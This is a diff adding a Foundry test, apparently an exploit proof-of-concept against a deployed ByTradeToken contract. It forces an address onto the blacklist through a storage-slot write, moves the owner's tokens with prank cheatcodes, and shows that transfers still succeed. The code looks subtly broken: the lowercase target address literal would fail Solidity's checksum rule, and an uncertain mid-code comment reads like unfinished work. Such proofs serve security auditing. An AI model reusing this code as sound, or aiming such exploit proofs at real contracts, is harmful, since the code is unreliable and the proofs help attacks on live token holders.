@@ -1,0 +1,60 @@
+```solidity
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for ByTradeToken functions we need
+interface IByTradeToken {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function paused() external view returns (bool);
+    function blacklist(address) external view returns (bool);
+    function owner() external view returns (address);
+}
+
+contract ExploitTest is Test {
+    IByTradeToken public byTradeToken;
+    address constant TARGET = 0xe8bd1ca97f8a0582335407b40b0576df641fa94c;
+    address constant VICTIM = 0x000000000000000000000000000000000000dEaD; // any address will do
+
+    function setUp() public {
+        byTradeToken = IByTradeToken(TARGET);
+        vm.label(TARGET, "ByTradeToken");
+        vm.label(VICTIM, "Victim");
+    }
+
+    function testBlacklistNotEnforced() public {
+        // The contract has a blacklist mapping but no functions to add or remove addresses.
+        // We simulate that a user (attacker) is blacklisted by directly writing to storage.
+        // Compute storage slot for mapping blacklist at slot 8 for key address(this)
+        bytes32 slot = keccak256(abi.encode(address(this), uint256(8)));
+        vm.store(TARGET, slot, bytes32(uint256(1)));
+
+        // Verify that blacklist mapping returns true for our address
+        assertTrue(byTradeToken.blacklist(address(this)), "Blacklist mapping should be true");
+
+        // Get some token balance for the attacker: we can use vm.prank with the owner? 
+        // The owner has all tokens. Let's make the attacker have some tokens by transferring from owner.
+        address owner = byTradeToken.owner();
+        uint256 ownerBalance = byTradeToken.balanceOf(owner);
+        vm.prank(owner);
+        byTradeToken.transfer(address(this), 100 ether);
+        assertEq(byTradeToken.balanceOf(address(this)), 100 ether, "Failed to give tokens to attacker");
+
+        // Now, despite being blacklisted, the attacker can transfer tokens.
+        uint256 victimBalanceBefore = byTradeToken.balanceOf(VICTIM);
+        vm.prank(address(this));
+        bool success = byTradeToken.transfer(VICTIM, 50 ether);
+        assertTrue(success, "Transfer should succeed even though sender is blacklisted");
+
+        uint256 victimBalanceAfter = byTradeToken.balanceOf(VICTIM);
+        assertEq(victimBalanceAfter, victimBalanceBefore + 50 ether, "Victim should receive tokens");
+
+        uint256 attackerBalanceAfter = byTradeToken.balanceOf(address(this));
+        assertEq(attackerBalanceAfter, 50 ether, "Attacker's balance reduced correctly");
+
+        // This demonstrates that the blacklist functionality is not enforced, violating the requirement
+        // that blacklisted addresses should be prevented from transferring tokens.
+    }
+}
+```
